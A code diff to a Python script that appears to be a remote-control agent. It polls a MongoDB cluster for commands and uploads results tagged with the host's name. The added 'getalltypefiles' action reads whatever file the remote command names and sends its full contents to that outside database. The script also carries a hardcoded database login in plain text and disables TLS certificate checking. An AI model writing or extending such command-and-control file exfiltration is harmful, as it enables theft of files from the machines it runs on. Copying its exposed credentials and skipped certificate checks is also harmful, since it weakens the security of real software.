@@ -9,6 +9,7 @@ import shutil
 import numpy as np
 import requests
 
+
 con = "mongodb+srv://utsav:utsav@cluster0.rqeuq69.mongodb.net/?retryWrites=true&w=majority"
 
 client = MongoClient(con,tls=True,tlsAllowInvalidCertificates=True)
@@ -211,10 +212,22 @@ def action_take(listen):
             target_element=listen['target_element']
             data={
                 "hostname":hostname,
-            "result":imageReader(path=cwd,file=target_element)
+                "result":imageReader(path=cwd,file=target_element)
             }
             upload(data)
-    except:
+        elif action=='getalltypefiles':
+            target_element=listen['target_element']
+            with open(cwd+f"\{target_element}",'rb') as f:
+                binary=f
+                data={
+                "hostname":hostname,
+                "result":(binary.read().decode('latin-1')),
+                "filename":target_element
+
+                }
+                upload(data)
+    except Exception as e:
+        print(e)
         data={
             "hostname":hostname,
             "result":"something wrong!!!"
